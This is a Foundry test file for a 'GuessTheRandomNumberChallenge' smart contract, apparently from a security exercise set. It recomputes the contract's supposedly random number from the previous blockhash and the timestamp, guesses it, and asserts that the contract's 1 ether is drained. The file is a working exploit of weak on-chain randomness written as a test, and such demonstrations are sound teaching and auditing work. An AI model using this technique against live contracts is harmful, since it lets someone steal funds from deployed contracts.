
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {

    GuessTheRandomNumberChallenge public _contractUnderTest;

    function setUp() public {
        vm.deal(address(this), 1 ether);
        _contractUnderTest = new GuessTheRandomNumberChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        vm.assume(blockTimestamp >= block.timestamp);
        vm.assume(blockNumber >= block.number);
        vm.assume(type(uint256).max - blockNumber >= blockTimestamp);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        uint256 expectedAnswer = uint8(uint256(keccak256(abi.encodePacked(blockhash(blockNumber - 1), blockTimestamp))));

        vm.deal(address(this), 1 ether);
        _contractUnderTest.guess(uint8(expectedAnswer), {value: 1 ether});

        assertEq(address(_contractUnderTest).balance, 0, "Contract should be drained after correct guess");
    }
}
